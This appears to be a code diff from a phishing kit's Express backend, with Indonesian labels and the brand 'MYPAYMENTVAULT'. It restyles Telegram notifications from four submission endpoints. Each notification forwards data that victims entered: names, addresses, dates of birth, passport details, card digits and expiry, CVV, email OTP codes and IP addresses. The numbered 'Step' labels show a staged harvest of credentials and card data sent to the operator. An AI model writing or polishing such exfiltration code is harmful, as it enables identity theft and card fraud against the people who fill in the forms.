@@ -67,19 +67,23 @@ router.post("/submissions/contact", async (req, res): Promise<void> => {
   const d = parsed.data;
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   void tgNotify(
-    `📋 <b>STEP AKHIR — Contact Form</b>\n\n` +
-    `👤 Username   : <code>${d.username}</code>\n` +
-    `🧑 Nama       : <code>${d.firstName ?? ""} ${d.lastName ?? ""}</code>\n` +
-    `📧 Email      : <code>${d.email ?? "-"}</code>\n` +
-    `📱 Telepon    : <code>${d.phone ?? "-"}</code>\n` +
-    `🏠 Alamat     : <code>${d.address ?? "-"}, ${d.city ?? ""} ${d.state ?? ""} ${d.postalCode ?? ""}</code>\n` +
-    `🎂 Tgl Lahir  : <code>${d.dob ?? "-"}</code>\n` +
-    `📝 Jenis      : <code>${d.inquiryType ?? "-"}</code>\n` +
-    `💬 Pesan      : <code>${d.message ?? "-"}</code>\n` +
-    `🗂️ Passport   : <code>${d.passportFilename ?? "-"}</code>\n` +
-    `🗂️ ID Karyawan: <code>${d.employeeIdFilename ?? "-"}</code>\n` +
-    `🌐 IP         : <code>${d.ipAddress ?? "-"}</code>\n` +
-    `🕐 Waktu      : ${now}`
+    `📋 <b>CONTACT FORM</b> — Step Akhir\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
+    `🧑 <b>Nama</b>       <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
+    `📧 <b>Email</b>      <code>${d.email ?? "-"}</code>\n` +
+    `📱 <b>Telepon</b>    <code>${d.phone ?? "-"}</code>\n` +
+    `🏠 <b>Alamat</b>     <code>${d.address ?? "-"}</code>\n` +
+    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
+    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n` +
+    `📝 <b>Jenis</b>      <code>${d.inquiryType ?? "-"}</code>\n` +
+    `💬 <b>Pesan</b>      <code>${d.message ?? "-"}</code>\n` +
+    `🛂 <b>Passport</b>   <code>${d.passportFilename ?? "-"}</code>\n` +
+    `🪪 <b>ID Karyawan</b> <code>${d.employeeIdFilename ?? "-"}</code>\n` +
+    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 <b>Waktu</b>      ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT</i>`
   );
   res.json({ ok: true });
 });
@@ -92,15 +96,18 @@ router.post("/submissions/card", async (req, res): Promise<void> => {
   const d = parsed.data;
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   void tgNotify(
-    `💳 <b>STEP 4 — Data Kartu</b>\n\n` +
-    `👤 Username    : <code>${d.username}</code>\n` +
-    `🪪 Crew ID     : <code>${d.crewId ?? "-"}</code>\n` +
-    `🛂 Passport No : <code>${d.passportNo ?? "-"}</code>\n` +
-    `💳 Kartu (8 digit terakhir): <code>${d.cardLast8 ?? "-"}</code>\n` +
-    `📅 Exp         : <code>${d.cardMonth ?? "-"}/${d.cardYear ?? "-"}</code>\n` +
-    `🔐 CVV         : <code>${d.cvv ?? "-"}</code>\n` +
-    `🌐 IP          : <code>${d.ipAddress ?? "-"}</code>\n` +
-    `🕐 Waktu       : ${now}`
+    `💳 <b>DATA KARTU</b> — Step 4\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
+    `🪪 <b>Crew ID</b>    <code>${d.crewId ?? "-"}</code>\n` +
+    `🛂 <b>Passport</b>   <code>${d.passportNo ?? "-"}</code>\n` +
+    `💳 <b>No. Kartu</b>  <code>${d.cardLast8 ?? "-"}</code>\n` +
+    `📅 <b>Exp</b>        <code>${d.cardMonth ?? "-"} / ${d.cardYear ?? "-"}</code>\n` +
+    `🔐 <b>CVV</b>        <code>${d.cvv ?? "-"}</code>\n` +
+    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 <b>Waktu</b>      ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT</i>`
   );
   res.json({ ok: true });
 });
@@ -113,17 +120,21 @@ router.post("/submissions/personal", async (req, res): Promise<void> => {
   const d = parsed.data;
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   void tgNotify(
-    `🧾 <b>STEP 4 — Data Personal</b>\n\n` +
-    `👤 Username : <code>${d.username}</code>\n` +
-    `🧑 Nama     : <code>${d.firstName ?? ""} ${d.lastName ?? ""}</code>\n` +
-    `📧 Email    : <code>${d.email ?? "-"}</code>\n` +
-    `📱 Telepon  : <code>${d.phone ?? "-"}</code>\n` +
-    `🏠 Alamat   : <code>${d.address ?? "-"}, ${d.city ?? ""} ${d.state ?? ""} ${d.postalCode ?? ""}</code>\n` +
-    `🎂 Tgl Lahir: <code>${d.dob ?? "-"}</code>\n` +
-    `📝 Jenis    : <code>${d.inquiryType ?? "-"}</code>\n` +
-    `💬 Pesan    : <code>${d.message ?? "-"}</code>\n` +
-    `🌐 IP       : <code>${d.ipAddress ?? "-"}</code>\n` +
-    `🕐 Waktu    : ${now}`
+    `🧾 <b>DATA PERSONAL</b> — Step 4\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>   <code>${d.username}</code>\n` +
+    `🧑 <b>Nama</b>       <code>${(d.firstName ?? "")} ${(d.lastName ?? "")}</code>\n` +
+    `📧 <b>Email</b>      <code>${d.email ?? "-"}</code>\n` +
+    `📱 <b>Telepon</b>    <code>${d.phone ?? "-"}</code>\n` +
+    `🏠 <b>Alamat</b>     <code>${d.address ?? "-"}</code>\n` +
+    `🏙️ <b>Kota</b>       <code>${d.city ?? "-"}, ${d.state ?? "-"} ${d.postalCode ?? ""}</code>\n` +
+    `🎂 <b>Tgl Lahir</b>  <code>${d.dob ?? "-"}</code>\n` +
+    `📝 <b>Jenis</b>      <code>${d.inquiryType ?? "-"}</code>\n` +
+    `💬 <b>Pesan</b>      <code>${d.message ?? "-"}</code>\n` +
+    `🌐 <b>IP</b>         <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 <b>Waktu</b>      ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT</i>`
   );
   res.json({ ok: true });
 });
@@ -136,12 +147,15 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
   const d = parsed.data;
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
   void tgNotify(
-    `🔢 <b>STEP 5 — Kode OTP Email</b>\n\n` +
-    `👤 Username : <code>${d.username}</code>\n` +
-    `📧 Email    : <code>${d.email ?? "-"}</code>\n` +
-    `🔑 OTP      : <code>${d.otpCode ?? "-"}</code>\n` +
-    `🌐 IP       : <code>${d.ipAddress ?? "-"}</code>\n` +
-    `🕐 Waktu    : ${now}`
+    `🔢 <b>KODE OTP EMAIL</b> — Step 5\n` +
+    `<code>────────────────────────</code>\n\n` +
+    `👤 <b>Username</b>  <code>${d.username}</code>\n` +
+    `📧 <b>Email</b>     <code>${d.email ?? "-"}</code>\n` +
+    `🔑 <b>Kode OTP</b>  <code>${d.otpCode ?? "-"}</code>\n` +
+    `🌐 <b>IP</b>        <code>${d.ipAddress ?? "-"}</code>\n` +
+    `🕐 <b>Waktu</b>     ${now}\n\n` +
+    `<code>────────────────────────</code>\n` +
+    `<i>🏦 MYPAYMENTVAULT</i>`
   );
   res.json({ ok: true });
 });
